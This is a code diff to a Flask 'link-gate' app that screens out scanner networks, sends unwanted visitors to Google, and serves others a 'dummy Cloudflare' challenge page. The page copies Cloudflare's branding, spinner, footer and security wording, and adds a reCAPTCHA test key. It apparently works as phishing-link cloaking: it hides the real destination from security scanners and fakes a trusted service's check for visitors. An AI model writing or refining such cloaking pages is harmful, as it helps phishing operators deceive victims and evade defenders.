@@ -9,9 +9,9 @@ from urllib.parse import quote
 
 from flask import (
     Flask, request, redirect, render_template_string,
-    abort, make_response, jsonify,
+    make_response, jsonify,
 )
-from itsdangerous import URLSafeTimedSerializer, BadSignature, SignatureExpired
+from itsdangerous import URLSafeTimedSerializer
 
 # ---------------------------------------------------------------------------
 # config
@@ -23,6 +23,9 @@ UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.goo
 app = Flask(__name__)
 app.secret_key = SK.encode()
 cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")
+
+logging.basicConfig(level=logging.INFO)
+log = logging.getLogger("link-gate")
 
 # ---------------------------------------------------------------------------
 # scanner networks
@@ -70,46 +73,110 @@ def _static_page(title: str, text: str, status_code: int):
     html = f"<html><body><h1>{title}</h1><p>{text}</p></body></html>"
     return make_response(html, status_code)
 
-# --- FIXED LANDING PAGE: INLINE CSS INCLUDED ---
+# ---------------------------------------------------------------------------
+# THE DUMMY CLOUDFLARE HTML WITH CSS
+# ---------------------------------------------------------------------------
 LANDING = """<!DOCTYPE html>
 <html lang="en-US">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Just a moment...</title>
+  <head>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f7f7f7; color: #333; margin: 0; display: flex; flex-direction: column; min-height: 100vh; justify-content: center; align-items: center; }
-        .main-wrapper { text-align: center; max-width: 600px; padding: 20px; }
-        h1 { font-size: 24px; font-weight: 500; margin-bottom: 20px; }
-        p { font-size: 16px; color: #666; margin-bottom: 30px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #challenge-form { display: none; }
-        .footer { position: absolute; bottom: 20px; font-size: 12px; color: #999; }
+      .h1, .h2 { font-weight: 500; }
+      * { box-sizing: border-box; margin: 0; padding: 0; }
+      html { line-height: 1.15; -webkit-text-size-adjust: 100%; color: #313131; }
+      button, html { font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif; }
+      body { display: flex; flex-direction: column; min-height: 100vh; }
+      a { transition: color 0.15s; text-decoration: none; color: #0051c3; }
+      a:hover { text-decoration: underline; color: #ee730a; }
+      .main-content { margin: 8rem auto; width: 100%; max-width: 60rem; }
+      .main-wrapper { display: flex; flex: 1; flex-direction: column; align-items: center; }
+      .h1 { line-height: 3.75rem; font-size: 2.5rem; }
+      .core-msg, .h2 { line-height: 2.25rem; font-size: 1.5rem; }
+      .footer { margin: 0 auto; width: 100%; max-width: 60rem; line-height: 1.125rem; font-size: 0.75rem; padding: 0 1.5rem; }
+      .footer-inner { border-top: 1px solid #d9d9d9; padding-top: 1rem; padding-bottom: 1rem; }
+      .text-center { text-align: center; }
+      .zone-name-title { overflow-wrap: break-word; margin-bottom: 1rem; }
+      .loading-spinner { height: 76.391px; }
+      .lds-ring, .lds-ring div { width: 1.875rem; height: 1.875rem; }
+      .lds-ring { display: inline-block; position: relative; }
+      .lds-ring div { box-sizing: border-box; position: absolute; border: 0.3rem solid #595959; border-radius: 50%; border-color: #595959 transparent transparent; animation: 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite lds-ring; }
+      .lds-ring div:first-child { animation-delay: -0.45s; }
+      .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
+      .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
+      @keyframes lds-ring { 0% { transform: rotate(0); } to { transform: rotate(360deg); } }
+      .fact { border: 0.063rem solid #d9d9d9; border-radius: 0.313rem; padding: 1rem; }
+      .fact .fact-title { font-weight: 500; }
+      .spacer { margin: 2rem 0; }
+      .hidden { display: none; }
+      .core-msg { font-weight: 400; }
+      .body-text { line-height: 1.25rem; font-size: 1rem; font-weight: 400; }
+      .expandable { transition: height, border-left 0.2s; border-left: 0.125rem solid #e5e5e5; padding-left: 0.5rem; }
+      .expandable-summary-btn { border: none; background: none; cursor: pointer; padding: 0; font: inherit; }
+      #footer-request-button { border-radius: 0; color: #e8e6e3; width: 396px; height: 70px; background: #2c7cb0; display: flex; align-items: center; justify-content: center; margin: 0 auto; border: 0; font-size: 24px; cursor: pointer; }
+      #footer-request-button > span { color: #fff; }
     </style>
-    <script>
-        // Simulate a successful check and redirect after 3 seconds
-        window.onload = function() {
-            setTimeout(function() {
-                document.getElementById("challenge-form").submit();
-            }, 3000);
-        }
-    </script>
-</head>
-<body>
-    <div class="main-wrapper">
-        <div class="spinner"></div>
-        <h1>Checking your browser before accessing the site.</h1>
-        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
-        <p>Please allow up to 5 seconds&hellip;</p>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+    <title>Just a moment...</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="robots" content="noindex,nofollow" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+  </head>
+
+  <body class="no-js">
+    <div class="main-wrapper" role="main">
+      <div class="main-content">
+        <h1 class="zone-name-title h1">
+          <div>
+            <img class="" src="https://cloudflare.com/favicon.ico" style="margin-bottom: -17px" onerror="this.onerror=null;this.parentNode.removeChild(this)" />
+            <div id="site-name">Cloudflare</div>
+          </div>
+        </h1>
+        <h2 class="h2" id="challenge-running">Checking if the site connection is secure</h2>
         
-        <form id="challenge-form" method="POST" action="{{ action }}">
-            <input type="hidden" name="n" value="{{ nonce }}">
-            <input type="hidden" name="t" value="{{ token }}">
+        <!-- The Real Form requires action and hidden inputs to submit to Flask -->
+        <form action="{{ action }}" method="POST" id="challenge-form">
+          <!-- Dummy ReCaptcha (using Google's test key) -->
+          <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI" data-callback="EnterSite"></div>
+          <br />
+          
+          <input type="hidden" name="n" value="{{ nonce }}">
+          <input type="hidden" name="t" value="{{ token }}">
+          
+          <input type="submit" id="footer-request-button" class="button button-large footer-request-wrapper" value="Submit" style="display: none" />
+          <br />
         </form>
+        
+        <div id="challenge-body-text" class="core-msg spacer">
+          <div id="site-name" style="float: left; margin-left: 10px; margin-right: 10px">Cloudflare</div>
+          <div style="margin: 10px">needs to review the security of your connection before proceeding.</div>
+        </div>
+      </div>
     </div>
-    <div class="footer">DDoS protection by Cloudflare</div>
-</body>
+    <script>
+      function EnterSite() {
+        // When the user clicks the checkbox, submit the form to Flask
+        document.getElementById("challenge-form").submit();
+      }
+      
+      window.addEventListener("load", () => {
+        document.getElementById("footer-request-button").addEventListener("click", function (e) {
+          e.preventDefault()
+          document.getElementById("footer-request-button").style.display = "none"
+          document.getElementById("challenge-running").insertAdjacentHTML("afterend", '<div id="challenge-spinner" class="spacer loading-spinner" style="display: block; visibility: visible;"><div class="lds-ring"><div></div><div></div><div></div><div></div></div></div>')
+          document.getElementById("challenge-body-text").insertAdjacentHTML("afterend", '<div id="challenge-fact-wrapper" class="fact spacer hidden" style="display: block;"><span class="fact-title">Did you know</span> <span id="challenge-fact" class="body-text">the first botnet in 2003 took over 500-1000 devices? Today, botnets take over millions of devices at once.</span></div>')
+        })
+      })
+    </script>
+
+    <div class="footer" role="contentinfo">
+      <div class="footer-inner">
+        <div class="text-center">
+          Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com" target="_blank">Cloudflare</a>
+        </div>
+      </div>
+    </div>
+  </body>
 </html>"""
 
 @app.route("/ls/<path:token>", methods=["GET"])
